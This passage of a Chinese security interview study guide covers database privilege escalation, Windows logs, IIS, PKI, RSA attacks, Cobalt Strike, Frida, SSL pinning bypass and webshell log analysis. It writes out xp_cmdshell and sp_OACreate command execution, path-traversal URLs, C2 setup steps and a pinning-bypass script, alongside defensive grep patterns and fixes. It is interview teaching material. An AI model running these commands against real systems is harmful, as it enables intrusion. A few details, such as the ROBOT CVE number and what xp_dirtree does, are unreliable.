**解析**：考察数据库提权核心技术。易错点：把 UDF 当万能（需插件目录可写）。面试官想听到：能讲清 UDF 注册步骤、知道 MOF 仅 Windows 且依赖 WMI、明白现代 MySQL 已限制。
**考察知识点**：UDF 注册流程（CREATE FUNCTION）、插件目录（@@plugin_dir）确认、MOF 提权 WMI 扫描原理、现代 MySQL 5.7+/8.x 提权难度上升。**→ 详见《面试精华宝典》精讲第 26 题**。

### Day 70 ｜ ★★★ MSSQL 数据库提权与命令执行方法
**题目**：MSSQL 提权与命令执行有哪些方法？
**答案**：
- **xp_cmdshell**（最直接）：
  - `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';`
  - 条件：sa 权限（默认关闭，需 sp_configure 开启）。
- **sp_OACreate**（COM 组件）：
  - `EXEC sp_OACreate 'wscript.shell', @shell OUT; EXEC sp_OAMethod @shell, 'run', null, 'whoami';`
  - 备选方案：xp_cmdshell 被禁时使用。
- **CLR Assembly**：
  - 创建 .NET 程序集，注册到 MSSQL，调用 `System.Diagnostics.Process.Start`。
  - 条件：sa + 启用 CLR 集成。
- **OpenRowSet + DNS 外带**（盲打）：
  - `EXEC OpenRowSet('SQLOLEDB', 'server=xxx;uid=sa;pwd=xxx', 'SELECT 1')`。
- **PowerShell 命令执行**：
  - 通过 xp_cmdshell 启动 `powershell -enc` 绕过杀软。
- **日志写 webshell**：
  - `EXEC xp_dirtree 'c:\inetpub\wwwroot\'` 创建目录树 + 日志命令执行。
- **xp_regread/xp_regwrite**：读写注册表（启动项写入）。
- **修复**：最小权限 + 关闭 xp_cmdshell + 修改 sa 默认端口 + 强口令 + 关闭远程登录。
**解析**：考察 MSSQL 数据库实操。易错点：以为所有 sa 都能直接用（默认关闭）。面试官想听到：能讲清 sp_configure 开启流程、知道 sp_OACreate 与 CLR 替代方案、明白 OpenRowSet 用于盲打。
**考察知识点**：xp_cmdshell 开启流程（sp_configure）、替代方案（sp_OACreate + CLR Assembly）、OpenRowSet 跨库访问、xp_dirtree + 日志写 webshell、注册表读写（启动项）。**→ 详见《面试精华宝典》精讲第 42 题**。

### Day 71 ｜ ★★★★ Windows 日志分析与关键事件 ID
**题目**：Windows 安全日志分析关注哪些关键事件 ID？
**答案**：
- **登录相关**：
  - **4624**：成功登录（含 Logon Type 2=交互、3=网络、4=批处理、10=RDP）。
  - **4625**：登录失败（爆破线索：多个相同账号失败）。
  - **4634/4647**：注销/关闭。
  - **4648**：使用显式凭据登录（提权常见）。
- **进程/服务**：
  - **4688**：进程创建（含命令行，需开启审计策略）。
  - **4697**：服务安装（persistence 关键事件）。
  - **7045**：服务安装（System 日志）。
- **账户/组**：
  - **4720**：创建用户。
  - **4722**：启用用户。
  - **4724/4723**：重置密码。
  - **4728/4732/4756**：用户加入特权组（Administrators/Remote Desktop Users）。
  - **4738**：用户变更。
- **对象访问**：
  - **4663**：文件访问。
  - **5145**：网络共享访问检查。
- **策略变更**：
  - **4719**：系统审计策略变更（攻击者清日志时会触发）。
  - **1102**：审计日志被清除（**红色警报！**）。
- **日志位置**：
  - `eventvwr.msc` → Windows 日志 → Security/System/Application。
  - 文件位置：`C:\Windows\System32\winevt\Logs\Security.evtx`。
- **常用工具**：LogParser、EventLog Explorer、Splunk、ELK、Chainsaw、Hayabusa。
**解析**：考察应急响应与日志分析核心。易错点：只说 4624/4625。面试官想听到：能列 10+ Event ID 及含义、知道 1102 是清日志红色警报、明白 Logon Type 区分登录方式。
**考察知识点**：关键 Event ID（4624/4625/4688/4720/4728/4738/1102）、Logon Type 2/3/4/10 区分、进程创建审计（4688 需开启策略）、日志清除 1102 红色警报、分析工具（LogParser/Chainsaw/Hayabusa）。**→ 详见《面试精华宝典》精讲第 31 题**。

### Day 72 ｜ ★★★ IIS 服务器安全保护措施
**题目**：IIS 服务器常见漏洞与安全加固？
**答案**：
- **常见漏洞**：
  - **IIS 6.0 解析漏洞**：`*.asp;*.jpg` 按 asp 解析；目录 `/*.asp/` 下文件当 asp。
  - **PUT 上传**（CVE-2017-7269）：IIS 6.0 WebDAV 缓冲区溢出。
  - **短文件名泄露**：`http://target.com/a*~1.*/x.aspx` 列出短文件名（含敏感文件）。
  - **IIS 7.0+ 解析漏洞**：`shell.jpg/.php` 触发 FastCGI 解析。
  - **目录遍历**：`http://target.com/..%5c..%5cwindows/system32/...`。
- **安全加固**：
  1. **升级到 IIS 10**（Win Server 2016+），不再支持 WebDAV 默认。
  2. **删除/禁用不需要的扩展**：PHP、ASP.NET 版本对应、CGI 模块按需。
  3. **关闭 WebDAV**（若不需要）。
  4. **限制 HTTP 方法**：仅允许 GET/POST/PUT/DELETE/HEAD/OPTIONS 中的必要项。
  5. **URL 重写**：拦截敏感路径（`/admin`、`/phpmyadmin`）。
  6. **配置 HTTPS**：启用 TLS 1.2/1.3 + HSTS。
  7. **限制上传目录执行权限**：用 `<location path="upload">` 配 `scriptProcessor=""`。
  8. **开启日志审计**：W3C 格式 + 集中日志服务器。
  9. **删除默认站点**：Default Web Site 含示例代码可能泄露。
  10. **文件权限**：web 目录仅 IIS_IUSRS 读、写入目录单独授权。
**解析**：考察 Windows Web 服务器加固。易错点：只说关闭 IIS。面试官想听到：能列具体漏洞类型（解析/短文件名/WebDAV）、明白按需开放原则、知道上传目录禁执行。
**考察知识点**：IIS 6 解析漏洞（;jpg/目录）、短文件名猜解、WebDAV 历史洞（CVE-2017-7269）、加固（升级/删除扩展/限制 HTTP 方法/上传目录禁执行）。**→ 详见《面试精华宝典》精讲第 39 题**。

---

# ============================================================

# 模块十二　加密深化 · 合规 · 移动 · 软技能

### Day 73 ｜ ★★★★ 等级保护 2.0 主要要求与流程
**题目**：等保 2.0 测评流程？三级系统的核心要求？
**答案**：
- **等保级别**：五级（自主/指导/监督/强制/专控保护），一般系统定级二/三级。
- **2.0 核心要求**（技术 + 管理两大体系）：
  - **安全物理环境**：防火/防雷/防静电/温控/监控。
  - **安全通信网络**：网络架构冗余、带宽保障、关键节点设备保护。
  - **安全区域边界**：边界防护（防火墙）、访问控制、恶意代码防范、流量监控。
  - **安全计算环境**：身份鉴别、访问控制、安全审计、入侵防范、数据完整性/保密性。
  - **安全管理中心**：集中管控、监测预警、安全事件响应。
- **扩展要求**（云计算/移动互联/物联网/工业控制/大数据）：分别有附加要求。
- **测评流程**：
  1. **定级备案**：自主定级 + 公安备案。
  2. **建设整改**：按级别要求做技术/管理改造。
  3. **测评**：第三方测评机构出具报告。
  4. **监督检查**：公安网安监督检查。
  5. **复测**：每年至少一次（**三级系统**）。
- **三级关键指标**：
  - 主机/网络访问控制 + 强制身份认证（密码 + 双因素）。
  - 安全审计覆盖所有用户行为（**留存 ≥ 6 个月**）。
  - 入侵防范（IDS/IPS/WAF）。
  - 集中管控（堡垒机、日志集中、补丁管理）。
- **二级差异**：审计要求 60 天，相对三级略弱。
**解析**：考察合规与体系建设。易错点：只说等保 1.0（已废）。面试官想听到：能讲清 2.0 五大扩展方向、知道三级要求严苛（含日志 ≥6 个月 + 集中管控）、明白测评流程 5 步。
**考察知识点**：五级体系（一般二/三级）、2.0 五大扩展（云/移动/物联网/工控/大数据）、测评流程 5 步、三级要求（审计 6 个月 + 集中管控 + 双因素）。**→ 详见《面试精华宝典》精讲第 25 题**。

### Day 74 ｜ ★★★ PKI 与 CA 数字证书体系
**题目**：PKI 体系是什么？证书如何签发与验证？
**答案**：
- **PKI（Public Key Infrastructure）**：基于公钥密码学的安全体系，提供身份认证、加密、签名、完整性。
- **核心组件**：
  - **CA（Certificate Authority）**：证书颁发机构，签发证书（根 CA + 中间 CA）。
  - **RA（Registration Authority）**：注册机构，审核申请。
  - **CRL（Certificate Revocation List）**：证书吊销列表。
  - **OCSP（Online Certificate Status Protocol）**：在线证书状态查询。
  - **KMS（Key Management System）**：密钥管理。
- **证书结构**（X.509 v3）：颁发者、主体、公钥、有效期、签名算法、扩展（SAN、Key Usage）。
- **证书链验证**：
  1. 客户端收到服务端证书 → 查找颁发者 CA → 用 CA 公钥验证签名 → 递归到根 CA。
  2. 检查证书有效期、域名（SAN）、用途（Key Usage）。
  3. 查询 OCSP/CRL 确认未吊销。
- **应用场景**：HTTPS（TLS 证书）、代码签名（驱动/应用签名）、邮件签名（S/MIME）、VPN 双向认证。
- **常见攻击**：
  - **CA 妥协**：DigiNotar（2011）签发了 500+ 假 Google 证书。
  - **证书伪造**：自签名证书 + 中间人。
  - **域名劫持**：申请 `*.example.com` 通配符证书劫持子域。
  - **Heartbleed/POODLE**：OpenSSL 历史漏洞。
- **修复**：使用权威 CA（Let's Encrypt / DigiCert）、强制 TLS 1.2+、OCSP Stapling、CAA 记录限制可签发 CA。
**解析**：考察证书体系与 HTTPS 底层。易错点：只说"CA 颁发证书"。面试官想听到：能讲清证书链验证流程、知道 OCSP/CRL 防吊销、了解 Heartbleed/POODLE 等历史漏洞、明白 CAA 记录防滥用。
**考察知识点**：PKI 核心组件（CA/RA/CRL/OCSP/KMS）、X.509 证书结构、证书链验证流程、历史 CA 事故（DigiNotar 2011）、CAA 记录与 OCSP Stapling。**→ 详见《面试精华宝典》精讲第 41 题**。

### Day 75 ｜ ★★★★ RSA 算法原理与攻击场景
**题目**：RSA 算法原理？常见攻击场景？
**答案**：
- **RSA 数学原理**：
  - 选两个大素数 p、q，n = p×q，φ(n) = (p-1)(q-1)。
  - 选 e（公钥指数，常 65537），d 是 e 模 φ(n) 的逆元（私钥）。
  - 加密：C = M^e mod n；解密：M = C^d mod n。
  - 安全性基于**大整数分解困难**（n 难分解）。
- **关键参数**：n ≥ 2048 位（现代标准，4096 更安全）。
- **常见攻击**：
  1. **小公钥指数攻击**（e=3）：M^e < n 时直接开 e 次方还原。
  2. **共模攻击**：同一明文用相同 n 不同 e 加密可恢复。
  3. **低加密指数广播攻击**（Håstad）：同一明文发 e 个用户，中国剩余定理恢复。
  4. **Wiener 攻击**：d 较小时（d < n^0.25）连分数分解。
  5. **Bleichenbacher 攻击**：PKCS#1 v1.5 填充预言（Padding Oracle）。
  6. **ROBOT 攻击**（CVE-2017-13082）：TLS RSA 加密密钥交换回退漏洞。
  7. **量子算法（Shor）**：量子计算机可多项式时间分解（威胁未来）。
- **最佳实践**：
  - 密钥 ≥ 2048 位，4096 更安全。
  - 使用 OAEP 填充（替代 PKCS#1 v1.5）。
  - 密钥分离：签名密钥与加密密钥分开。
  - 防侧信道：恒定时间实现。
**解析**：考察算法理解 + 攻击场景。易错点：只说"大数难分解"。面试官想听到：能讲清 Wiener/Bleichenbacher/ROBOT 等具体攻击、知道 OAEP 替代 PKCS#1 v1.5、了解量子威胁。
**考察知识点**：RSA 数学原理（p/q/n/φ/e/d）、攻击（小公钥/共模/Wiener/Bleichenbacher/ROBOT）、填充（PKCS#1 v1.5 vs OAEP）、量子威胁（Shor 算法）。**→ 详见《面试精华宝典》精讲第 34 题**。

### Day 76 ｜ ★★★ Cobalt Strike 使用与 CS 反制方法
**题目**：Cobalt Strike（CS）是什么？红队怎么用？蓝队如何反制？
**答案**：
- **Cobalt Strike（CS）**：商业红队 C2（Command & Control）框架，包含 team server、client GUI、beacon payload、Aggressor 脚本。
- **核心组件**：
  - **Listener**：监听 beacon 上线（HTTP/HTTPS/DNS/SMB）。
  - **Beacon**：植入目标主机的 payload（C/C#/Python/Java）。
  - **Aggressor Script**：Sleep 脚本（自动化 + UI 定制）。
- **红队使用流程**：
  1. 启动 team server：`./teamserver IP password`。
  2. client 连接，建 Listener（HTTP 80 / HTTPS 443）。
  3. 生成 payload：Attacks → Packages → Windows Executable。
  4. 投递执行（钓鱼/捆绑/植入），beacon 上线。
  5. 后渗透：进程迁移、提权、横向、文件操作、端口转发、SOCKS 代理。
- **隐蔽技术**：
  - **Malleable C2 Profile**：自定义 HTTP/HTTPS 流量画像（伪装合法域名）。
  - **Sleep + jitter**：心跳随机化躲流量检测。
  - **进程注入**：beacon 注入合法进程（svchost/explorer）。
  - **域前置**（Domain Fronting）：CDN 加速 + 真实 C2 隐藏。
  - **DNS Beacon**：隧道走 DNS 53 端口。
- **蓝队反制**：
  1. **流量特征**：默认 90s 心跳 + UA 含 `Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)`（已被广泛识别，建议改 Malleable Profile）。
  2. **样本分析**：内存 dump 找 CS 特征字符串（`%c%c%c`、`%s as %s\\\\%s`、`cobaltstrike`）。
  3. **证书指纹**：CS HTTPS 默认证书可被 IDS 比对。
  4. **DNS 隧道检测**：监控大量异常 TXT/AAAA 查询。
  5. **EDR 检测**：beacon 注入进程、横向命令（psexec/wmic）行为告警。
  6. **日志关联**：CS 默认写 cna 脚本到 AppData，可取证。
- **替代品**：Sliver（开源）、Havoc、Mythic。
**解析**：考察现代红蓝对抗核心。易错点：只说"C2 工具"。面试官想听到：能讲清 Malleable Profile 流量定制、知道默认特征已被识别、明白 Sliver/Havoc 等开源替代。
**考察知识点**：CS 三大组件（Listener/Beacon/Aggressor）、Malleable C2 流量画像定制、隐蔽技术（Sleep+jitter/进程注入/DNS Beacon）、蓝队反制（流量特征+内存取证+EDR 行为告警）、开源替代（Sliver/Havoc/Mythic）。**→ 详见《面试精华宝典》精讲第 50 题**。

### Day 77 ｜ ★★★★ Frida 移动端 Hook 框架原理与使用
**题目**：Frida 是什么？移动端安全测试如何使用？
**答案**：
- **Frida**：动态插桩工具，通过向运行中的进程注入 JavaScript/V8 引擎，Hook 函数调用、修改返回值、调用栈跟踪。
- **架构**：
  - **Frida Server**：注入到目标设备（Android/iOS），与 Frida Client 通信。
  - **Frida Client**：Python/Node.js 绑定，本地编写脚本。
  - **Gadget**：静态注入版本（用于脱壳/分析）。
- **核心功能**：
  - **Hook 函数**：`Java.perform(function() { var cls = Java.use('com.app.target'); cls.method.implementation = function() { return 'modified'; }; });`
  - **调用栈**：`Java.use('android.util.Log').d.implementation = function() { console.log(Java.use('android.util.Log').getStackTraceString(...)); };`
  - **绕过 SSL Pinning**：Hook `TrustManagerFactory` / `X509TrustManager`。
  - **脱壳**：Hook `DexFile.loadDex`、Hook 各种加固厂商的解密函数。
  - **Hook Native**：用 `Interceptor.attach(Module.findExportByName('libc.so', 'open'), ...)`。
- **使用流程（Android）**：
  1. `adb push frida-server /data/local/tmp/`
  2. `adb shell chmod 755 /data/local/tmp/frida-server`
  3. `adb shell su -c /data/local/tmp/frida-server &`
  4. `frida -U -f com.target.app -l hook.js --no-pause`。
- **常见场景**：SSL Pinning 绕过、加密算法 Hook（看明文）、协议分析（Hook 网络请求）、脱壳（Hook 各类加固）、Root/越狱检测绕过。
- **检测对抗**：检测 frida-server 端口（27042 默认）、检测 `/proc/self/maps` 中的 frida-agent、检测 frida-gadget 的特征字符串、双进程保护。
**解析**：考察移动安全核心工具。易错点：只说"Hook 工具"。面试官想听到：能写简单 JS Hook 代码、知道 SSL Pinning 绕过原理、了解 frida 检测对抗方法、明白 Frida 在脱壳中的角色。
**考察知识点**：Frida 架构（Server/Client/Gadget）、Java.use + implementation 注入、Interceptor.attach Hook Native、SSL Pinning 绕过思路、frida-server 端口 27042 + 检测对抗。**→ 详见《面试精华宝典》精讲第 37 题**。

### Day 78 ｜ ★★★ Android APK 反编译与加固对抗方法
**题目**：Android APK 如何反编译？常见加固方案如何对抗？
**答案**：
- **APK 反编译工具**：
  - **apktool**：反编译资源（AndroidManifest.xml、布局 XML）。
  - **jadx**：反编译 Java 源码（DEX → Java）。
  - **JEB**：商业反编译（更强，处理混淆）。
  - **GDA**：国产反编译工具。
- **反编译流程**：
  1. `apktool d target.apk` → 得到 smali 代码、资源。
  2. `jadx-gui target.apk` → 反编译 Java 源码。
  3. `unzip` 解压查看 assets/lib/META-INF。
- **代码保护（加固）方案**：
  - **混淆**（ProGuard/R8）：类名/方法名替换，逆向难度↑。
  - **字符串加密**：关键字符串加密存储（XOR/AES）。
  - **DEX 加密/壳**（梆梆/360/爱加密/腾讯乐固）：DEX 加密，运行时动态解密。
  - **VMP/DexProtect**：将 Java/Kotlin 编译为自定义字节码 + 虚拟机执行。
  - **Native 化**：核心逻辑移到 C/C++（IDA 反编译看）。
  - **JS/H5 化**：逻辑放前端（WebView 加载 JS）。
  - **签名校验**：防二次打包。
- **对抗方法**：
  - **脱壳**：
    - **DEX Dump**：Hook `DexFile.loadDex`、Hook `ClassLoader.loadClass`，dump 内存中的完整 DEX。
    - **Xposed/Frida Hook** 壳的解密函数（不同加固厂商不同）。
    - **FART**（基于 ART 的脱壳）。
  - **反混淆**：JEB Pro 手动重命名、关键函数追踪（Hook + 调用栈）、字符串解密（运行时 Hook 拿到明文）。
  - **Native 分析**：IDA Pro/Ghidra + Frida Hook（看输入输出）。
  - **Web/H5 化**：Chrome 远程调试 / Charles 抓包。
**解析**：考察移动逆向基础。易错点：只说 apktool。面试官想听到：能区分反编译（资源/源码）和脱壳（DEX 还原）、了解 VMP/Native 化加固对抗思路、知道 Frida Hook 在脱壳中的作用。
**考察知识点**：反编译工具链（apktool/jadx/JEB）、加固方案（混淆/DEX 加密/VMP/Native 化）、脱壳思路（Hook DexFile.loadDex + 内存 dump）、Frida 在脱壳中的作用、签名校验防二次打包。**→ 详见《面试精华宝典》精讲第 51 题**。

### Day 79 ｜ ★★★ App 抓包方法与 SSL Pinning 绕过
**题目**：如何对 Android App 抓包？遇到 SSL Pinning 怎么办？
**答案**：
- **抓包工具**：**Charles / Fiddler**（HTTP/HTTPS 抓包，需安装证书）、**Burp Suite**（渗透测试标配）、**mitmproxy**（命令行可脚本化）、**tcpdump/Wireshark**（底层抓包，绕证书）、**Packet Capture**（Android，免 root VPN 抓包）。
- **抓包前提**：
  - **绕过证书校验**：App 默认信任系统证书，但部分只信任自有证书（SSL Pinning）。
  - **绕过代理检测**：部分 App 检测 Wi-Fi 代理设置。
- **证书安装**：
  - **系统证书**（Android 7+）：用户安装的证书不被信任（networkSecurityConfig 默认）。
  - **Magisk + MagiskTrustUserCerts**：把用户证书移到系统证书。
  - **Frida/Objection 注入**：把 Burp 证书安装到应用私有目录。
- **SSL Pinning 绕过方法**：
  1. **Frida + objection**：`objection -g com.target.app explore` → `android sslpinning disable`。
  2. **Frida 自定义脚本**（objection 失败时）：
     ```javascript
     Java.perform(function() {
       var TrustManager = Java.use('com.android.org.conscrypt.TrustManagerImpl');
       TrustManager.verifyChain.implementation = function() { return []; };
     });
     ```
  3. **Xposed + JustTrustMe**：Hook 所有证书校验类（TrustManagerFactory/X509TrustManager/HostnameVerifier/OkHostnameVerifier）。
  4. **Hook OkHttp 3.x**：`okhttp3.CertificatePinner.check` 直接返回 true。
  5. **Native Hook**：Hook `libssl.so` 的 `SSL_CTX_set_verify` 不验证。
  6. **逆向去除校验**：直接修改 smali/二进制，去除证书校验代码。
  7. **重打包**：修改 AndroidManifest.xml + 重新签名。
- **HTTPS 单向 vs 双向认证**：
  - 单向：客户端校验服务端证书（App 默认）。
  - 双向：服务端也校验客户端证书（更高安全性，反编译找证书）。
- **iOS 抓包**：**Charles/Proxyman + 描述文件**、**frida-iOS-dump**（Hook + 脱壳）、**Stream**（iOS 14+ 抓包，免越狱）。
**解析**：考察移动安全实操。易错点：只说装证书。面试官想听到：能讲清 Android 7+ 用户证书失效、知道 Frida + objection 一键绕过、明白 OkHttp 单独 Hook、知道双向认证需要逆向找客户端证书。
**考察知识点**：抓包工具链（Charles/Burp/mitmproxy/tcpdump）、Android 7+ 用户证书失效 + Magisk 修复、SSL Pinning 绕过（Frida/Objection/Xposed/Native Hook）、OkHttp CertificatePinner 单独 Hook、HTTPS 双向认证（客户端证书）。**→ 详见《面试精华宝典》精讲第 52 题**。

### Day 80 ｜ ★★★ 护网行动报告撰写要点与汇报技巧
**题目**：护网行动报告如何撰写？汇报有什么技巧？
**答案**：
- **报告结构**：
  1. **概述**：项目背景（客户/目标/时间/范围/授权）、团队组成（红蓝分工）。
  2. **攻击方总结**：外网突破路径、内网横向路径、最终得分靶标、关键时间节点。
  3. **防守方总结**：监测告警数量、响应时效（首次告警→处置完成时长）、溯源反制成果。
  4. **漏洞清单**（按 CVSS 3.1 评分）：漏洞名、危害、复现步骤、影响资产、修复建议、复测结果。
  5. **关键事件**：高危事件时间线（发现→确认→处置→关闭）。
  6. **加固建议**：短期（紧急补丁）+ 中期（架构调整）+ 长期（持续运营）。
  7. **附件**：截图、流量样本、漏洞 PoC、复现视频。
- **撰写要点**：
  - **量化数据**：扫描 N 个资产、发现 N 个漏洞、阻断 N 次攻击、溯源 N 个攻击者。
  - **时间轴**：每个事件精确到分钟，便于复盘。
  - **风险评级**：CVSS 评分 + 业务影响（结合客户业务给权重）。
  - **可视化**：时间线图、攻击拓扑图、统计图表。
  - **可执行修复**：补丁版本号 / 配置命令 / 厂商工单号。
- **汇报技巧**：
  - **PPT 大纲**：背景 → 战果 → 关键漏洞 → 加固建议 → 致谢。
  - **讲故事**：开场讲一个具体攻击链案例（从邮件钓鱼到域控），比堆数据更生动。
  - **金句**：用一句话总结工作亮点（"发现并阻止 17 起境外 APT 攻击"）。
  - **预判问题**：评委常问"如果再给 X 时间你会做什么"——答"自动化剧本 + 零信任落地"。
  - **避免**：过度技术细节（评审不全是技术）、模糊数字（"很多""大量"→ 用具体数）、推卸责任。
- **模板**：OWASP 安全报告模板、PTES 报告模板、NIST 安全评估模板。
**解析**：考察沟通与汇报能力（实战加分项）。易错点：只列漏洞不说业务影响。面试官想听到：能讲清报告 7 段结构、量化数据 + 时间线、明白讲故事比堆数据更有效。
**考察知识点**：报告 7 段结构（概述/红队/蓝队/漏洞/事件/加固/附件）、CVSS 评分 + 业务影响加权、PPT 大纲与讲故事技巧、量化指标与时间线。**→ 详见《面试精华宝典》精讲第 55 题**。

### Day 81 ｜ ★★★ 安全岗位面试自我介绍与职业规划
**题目**：面试时如何自我介绍？职业规划怎么讲？
**答案**：
- **自我介绍结构**（2-3 分钟）：
  1. **基本信息**：姓名、学校、专业、工作年限。
  2. **核心能力**：3-5 个关键技能（如渗透测试 / 应急响应 / 代码审计）。
  3. **项目经验**：2-3 个代表作（项目名 + 角色 + 量化成果）。
  4. **证书 / 培训**：CISP-PTE / OSCP / RHCE 等。
  5. **求职意向**：方向（红队 / 应用安全 / 安全运营）+ 加入动机（业务/团队/技术栈）。
- **示例**：
  > "您好，我叫张三，毕业于 XX 大学信息安全专业，有 3 年安全行业经验。过去主要做 **渗透测试与红队评估**，参与过 5+ 甲方项目，发现过 **Log4Shell、Spring4Shell** 等重大漏洞。工具链熟悉 **Burp + MSF + Cobalt Strike + Python**。上一份工作负责某互联网公司 200+ 业务系统的安全评估，建立了内部 SRC 运营流程。这份简历有 **CISP-PTE、OSCP** 证书。这次求职希望深耕 **红队/应用安全** 方向，希望能加入贵司的安全研究团队。"
- **职业规划模板**：
  - **1 年**：融入团队 + 熟悉业务。
  - **3 年**：成为某方向专家（如红队 / 应急响应 / 数据安全）。
  - **5 年**：带小团队 + 主导项目。
  - **10 年**：技术总监 / CSO / 创业者。
- **高频问题应对**：
  - **"你的缺点"**：答"过度技术细节，有时影响项目效率。学习用 OKR 设优先级"。
  - **"为什么离职"**：答"寻求更大平台 / 更深技术栈"（避免负面）。
  - **"期望薪资"**：反问"贵司该岗位预算范围" + "我目前 XX，期待 XX"。
  - **"没有某经验"**：答"我具备 XX 核心能力 + 计划 1-3 个月达到团队平均"。
- **避免**：流水账读简历、过度谦虚/过度自信、贬低前公司、离题（讲技术细节不归题）。
**解析**：考察表达与自我认知。易错点：流水账介绍。面试官想听到：能用项目+数据说话、有清晰职业路径、对岗位有认知。
**考察知识点**：自我介绍 5 段（基本信息/能力/项目/证书/意向）、STAR-L 法则讲故事、职业规划 1/3/5/10 年模板、高频问题应对（缺点/离职/薪资/经验不足）。**→ 详见《面试精华宝典》精讲第 56 题**。

### Day 82 ｜ ★★★ Web 日志分析定位 WebShell 与入侵痕迹
**题目**：Web 日志分析如何定位 WebShell 与入侵痕迹？
**答案**：
- **日志来源**：
  - **Web 访问日志**（Nginx/Apache/IIS）：`access.log`（默认）+ `error.log`。
  - **WAF 日志**：拦截的恶意请求。
  - **应用日志**：业务日志（登录/支付/上传）。
  - **中间件日志**：Tomcat/Catalina.out、WebLogic server.log。
- **WebShell 上传痕迹识别**：
  - 异常 POST 请求（大量 + 大文件）。
  - 上传路径含 `upload/`、`/tmp/`、`/var/www/` 等可写目录。
  - 文件名异常：`shell.php`、`cmd.jsp`、`xxx.php.bak`。
  - 上传时间与工作时间不符（非业务时段）。
  - 同一 IP 短时间内多次上传/失败。
- **WebShell 访问痕迹识别**：
  - 访问 `*.php`、`*.jsp`、`*.aspx` 时长异常（0.001s 返回，可能 webshell 本身无操作）。
  - 访问 URL 含 `?cmd=`、`?id=`、`?exec=`、`@eval(base64_decode(...))`。
  - HTTP 状态码异常：大量 200 但响应大小极小。
  - Referer/UA 异常：`python-requests`、`curl`、`wget`、`sqlmap`、`nmap`。
  - 同一会话高频访问（心跳特征）。
- **入侵路径还原**：
  - **时间线**：首个异常请求 → 上传请求 → 首次访问 webshell → 提权命令 → 横向移动。
  - **攻击者画像**：IP、UA、工具特征（sqlmap/awvs/burp）。
  - **关联日志**：WAF 拦截记录、SSH 登录日志、计划任务变更、进程创建。
- **常用命令**（Linux）：
  - `awk '{print $1}' access.log | sort | uniq -c | sort -rn | head` —— 访问 IP 统计。
  - `grep "POST" access.log | grep -i ".php" | grep -v "upload/"` —— 异常 POST。
  - `grep -E "(\.php\?|eval|base64_decode|system\()" access.log` —— 可疑 URL。
  - `grep "200" access.log | awk '$NF < 100 {print}'` —— 小响应大小（webshell 探测）。
- **工具**：GoAccess（实时分析）、LogParser（IIS）、Splunk/ELK（集中分析）、Chainsaw/Hayabusa（Windows 事件）。
- **深度取证**：
  - 比对基线文件（找新增 webshell）。
  - Web 目录文件 hash（inotifywait 监控变更）。
  - 内存马检测（Java Filter/Servlet 注册）。
**解析**：考察应急响应实战能力。易错点：只看 access.log 不看 error.log/WAF 日志。面试官想听到：能讲清 WebShell 时间线还原、熟悉常用 grep/awk 命令、明白内存马需要进程/类加载分析。
**考察知识点**：WebShell 上传/访问特征识别（POST/路径/UA/响应大小）、时间线还原与攻击者画像、Linux grep/awk 日志分析命令、工具链（GoAccess/Splunk/ELK）、内存马与 webshell 双轨检测。**→ 详见《面试精华宝典》精讲第 54 题**。

